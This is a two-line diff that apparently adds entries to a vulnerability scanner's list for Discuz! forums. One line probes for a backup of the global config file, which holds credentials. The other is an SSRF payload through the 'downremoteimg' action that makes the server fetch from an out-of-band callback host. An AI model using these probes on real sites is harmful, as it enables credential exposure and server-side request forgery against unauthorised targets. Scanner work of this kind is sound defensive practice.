@@ -1,0 +1,2 @@
+/config/config_global.php.bak
+/forum.php?mod=ajax&action=downremoteimg&message=[img]http://{{interactsh-url}}/test?.jpg[/img]
